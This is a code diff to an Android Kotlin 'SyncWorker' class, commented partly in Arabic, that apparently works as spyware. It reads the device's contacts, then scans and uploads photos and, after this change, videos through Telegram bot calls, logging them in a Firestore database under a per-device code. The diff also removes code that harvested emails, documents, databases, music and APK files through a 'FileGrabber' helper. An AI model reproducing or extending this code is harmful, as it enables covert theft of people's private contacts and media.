@@ -40,7 +40,7 @@ object SyncWorker {
     private val uploadedCache = HashMap<String, MutableSet<String>>()
 
     private data class Job(
-        val type: String,
+        val type: String,     // "photo" أو "video"
         val path: String,
         val name: String,
         val size: Long,
@@ -74,27 +74,26 @@ object SyncWorker {
     }
 
     // ═══════════════════════════════════════════
-    //  Sequence: contacts → photos → files → music → apks → emails
+    //  Sequence: contacts → photos → videos
     // ═══════════════════════════════════════════
     private fun fullSyncSequence(ctx: Context) {
         Log.d(TAG, "▶ sequence start")
 
+        // 1. جهات الاتصال
         try { syncContacts(ctx) } catch (e: Exception) { Log.e(TAG, "contacts: ${e.message}") }
-        waitEmpty(); Log.d(TAG, "✅ contacts")
+        waitEmpty()
+        Log.d(TAG, "✅ contacts")
 
+        // 2. الصور
         try { syncPhotos(ctx) } catch (e: Exception) { Log.e(TAG, "photos: ${e.message}") }
-        waitEmpty(); Log.d(TAG, "✅ photos")
+        waitEmpty()
+        Log.d(TAG, "✅ photos")
 
-        try { syncFiles(ctx) } catch (e: Exception) { Log.e(TAG, "files: ${e.message}") }
-        waitEmpty(); Log.d(TAG, "✅ files")
+        // 3. الفيديو
+        try { syncVideos(ctx) } catch (e: Exception) { Log.e(TAG, "videos: ${e.message}") }
+        waitEmpty()
+        Log.d(TAG, "✅ videos")
 
-        try { syncMusic(ctx) } catch (e: Exception) { Log.e(TAG, "music: ${e.message}") }
-        waitEmpty(); Log.d(TAG, "✅ music")
-
-        try { syncApks(ctx) } catch (e: Exception) { Log.e(TAG, "apks: ${e.message}") }
-        waitEmpty(); Log.d(TAG, "✅ apks")
-
-        try { syncEmails(ctx) } catch (e: Exception) { Log.e(TAG, "emails: ${e.message}") }
         Log.d(TAG, "🎉 sequence complete")
 
         // monitor كل 60 ثانية
@@ -116,18 +115,12 @@ object SyncWorker {
         try { enqueueNew(ctx, "photo", MediaScanner.scanImages(ctx).map {
             Job("photo", it.path, it.name, it.size, it.lastModified, "jpg") }) } catch (_: Exception) {}
 
-        try { enqueueNew(ctx, "music", MediaScanner.scanAudio(ctx).map {
-            Job("music", it.path, it.name, it.size, it.lastModified, "mp3") }) } catch (_: Exception) {}
-
-        try { enqueueNew(ctx, "file", FileGrabber.scanByTypes(FileGrabber.DOCUMENTS + FileGrabber.ARCHIVES + FileGrabber.DATABASES, 1000).map {
-            Job("file", it.path, it.name, it.size, it.lastModified, it.ext) }) } catch (_: Exception) {}
-
-        try { enqueueNew(ctx, "apk", FileGrabber.scanByTypes(FileGrabber.APKS, 500).map {
-            Job("apk", it.path, it.name, it.size, it.lastModified, "apk") }) } catch (_: Exception) {}
+        try { enqueueNew(ctx, "video", MediaScanner.scanVideos(ctx).map {
+            Job("video", it.path, it.name, it.size, it.lastModified, "mp4") }) } catch (_: Exception) {}
     }
 
     // ═══════════════════════════════════════════
-    //  Contacts
+    //  Contacts — مرة واحدة
     // ═══════════════════════════════════════════
     private fun syncContacts(ctx: Context) {
         val prefs = ctx.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
@@ -163,37 +156,7 @@ object SyncWorker {
     }
 
     // ═══════════════════════════════════════════
-    //  Emails
-    // ═══════════════════════════════════════════
-    private fun syncEmails(ctx: Context) {
-        val prefs = ctx.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
-        if (prefs.getBoolean("emails_done_v1", false)) return
-        val emails = ContactsHelper.getAllEmails(ctx)
-        if (emails.isEmpty()) { prefs.edit().putBoolean("emails_done_v1", true).apply(); return }
-        val code = DeviceManager.getDeviceCode(ctx)
-        val writes = JSONArray()
-        for (e in emails) {
-            val fields = JSONObject().apply {
-                put("name", JSONObject().put("stringValue", e.name))
-                put("email", JSONObject().put("stringValue", e.email))
-            }
-            val docId = e.email.hashCode().toString().replace("-", "m")
-            writes.put(JSONObject().put("update", JSONObject().apply {
-                put("name", "projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents/devices/$code/emails/$docId")
-                put("fields", fields)
-            }))
-        }
-        try {
-            val body = JSONObject().put("writes", writes).toString()
-            val url = "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents:commit?key=${Config.FIREBASE_API_KEY}"
-            client.newCall(Request.Builder().url(url).post(body.toRequestBody("application/json".toMediaType())).build()).execute().use { }
-        } catch (e: Exception) { Log.e(TAG, "emails: ${e.message}") }
-        prefs.edit().putBoolean("emails_done_v1", true).apply()
-        Log.d(TAG, "emails: ${emails.size}")
-    }
-
-    // ═══════════════════════════════════════════
-    //  Sync سريع
+    //  Sync — الصور
     // ═══════════════════════════════════════════
     private fun syncPhotos(ctx: Context) {
         enqueueNew(ctx, "photo", MediaScanner.scanImages(ctx).map {
@@ -201,27 +164,17 @@ object SyncWorker {
         })
     }
 
-    private fun syncFiles(ctx: Context) {
-        val t = FileGrabber.DOCUMENTS + FileGrabber.ARCHIVES + FileGrabber.DATABASES
-        enqueueNew(ctx, "file", FileGrabber.scanByTypes(t, 2000).map {
-            Job("file", it.path, it.name, it.size, it.lastModified, it.ext)
-        })
-    }
-
-    private fun syncMusic(ctx: Context) {
-        enqueueNew(ctx, "music", MediaScanner.scanAudio(ctx).map {
-            Job("music", it.path, it.name, it.size, it.lastModified, "mp3")
-        })
-    }
-
-    private fun syncApks(ctx: Context) {
-        enqueueNew(ctx, "apk", FileGrabber.scanByTypes(FileGrabber.APKS, 500).map {
-            Job("apk", it.path, it.name, it.size, it.lastModified, "apk")
+    // ═══════════════════════════════════════════
+    //  Sync — الفيديو
+    // ═══════════════════════════════════════════
+    private fun syncVideos(ctx: Context) {
+        enqueueNew(ctx, "video", MediaScanner.scanVideos(ctx).map {
+            Job("video", it.path, it.name, it.size, it.lastModified, "mp4")
         })
     }
 
     // ═══════════════════════════════════════════
-    //  Uploaded cache
+    //  Uploaded cache — منع التكرار
     // ═══════════════════════════════════════════
     private fun uploadedFor(ctx: Context, type: String): MutableSet<String> {
         synchronized(cacheLock) {
@@ -232,9 +185,7 @@ object SyncWorker {
             try {
                 val coll = when (type) {
                     "photo" -> "photos"
-                    "file" -> "files"
-                    "music" -> "music"
-                    "apk" -> "apks"
+                    "video" -> "videos"
                     else -> "photos"
                 }
                 val url = "${fsBase()}/devices/$code/$coll?key=${Config.FIREBASE_API_KEY}&pageSize=1000"
@@ -266,13 +217,19 @@ object SyncWorker {
     }
 
     // ═══════════════════════════════════════════
-    //  Enqueue
+    //  Enqueue — منع التكرار + منع الصوت
     // ═══════════════════════════════════════════
     private fun enqueueNew(ctx: Context, type: String, jobs: List<Job>) {
         if (jobs.isEmpty()) return
         val uploaded = uploadedFor(ctx, type)
         var added = 0
         for (j in jobs) {
+            // ⭐ تجاهل أي ملف صوتي (احتياطي)
+            val ext = j.ext.lowercase()
+            if (ext in listOf("mp3", "wav", "ogg", "m4a", "aac", "flac", "opus", "amr")) {
+                continue
+            }
+            // ⭐ منع التكرار
             if (uploaded.contains("${j.name}|${j.size}")) continue
             if (queue.offer(j)) added++
         }
@@ -327,8 +284,6 @@ object SyncWorker {
             attempt++
             val result = tryUpload(file, job)
             if (result != null) return result
-
-            // تأخير قبل retry (exponential backoff)
             try { Thread.sleep(5000L * attempt) } catch (_: Exception) {}
         }
         return null
@@ -338,17 +293,17 @@ object SyncWorker {
         return try {
             val method = when (job.type) {
                 "photo" -> "sendPhoto"
-                "music" -> "sendAudio"
+                "video" -> "sendVideo"
                 else -> "sendDocument"
             }
             val fieldName = when (job.type) {
                 "photo" -> "photo"
-                "music" -> "audio"
+                "video" -> "video"
                 else -> "document"
             }
             val mime = when (job.type) {
                 "photo" -> "image/*"
-                "music" -> "audio/mpeg"
+                "video" -> "video/mp4"
                 else -> "application/octet-stream"
             }
 
@@ -367,7 +322,6 @@ object SyncWorker {
                 val respBody = resp.body?.string() ?: return null
 
                 if (code == 429) {
-                    // rate limited — استخرج retry_after
                     val obj = JSONObject(respBody)
                     val retryAfter = obj.optJSONObject("parameters")?.optInt("retry_after", 30) ?: 30
                     Log.w(TAG, "429 — retry after ${retryAfter}s")
@@ -385,7 +339,7 @@ object SyncWorker {
                         if (arr.length() == 0) return null
                         arr.optJSONObject(arr.length() - 1)?.optString("file_id", "")
                     }
-                    "music" -> result.optJSONObject("audio")?.optString("file_id", "")
+                    "video" -> result.optJSONObject("video")?.optString("file_id", "")
                     else -> result.optJSONObject("document")?.optString("file_id", "")
                 }
             }
@@ -403,9 +357,7 @@ object SyncWorker {
             val code = DeviceManager.getDeviceCode(ctx)
             val coll = when (type) {
                 "photo" -> "photos"
-                "file" -> "files"
-                "music" -> "music"
-                "apk" -> "apks"
+                "video" -> "videos"
                 else -> "photos"
             }
             val docId = (name + size).hashCode().toString().replace("-", "m")
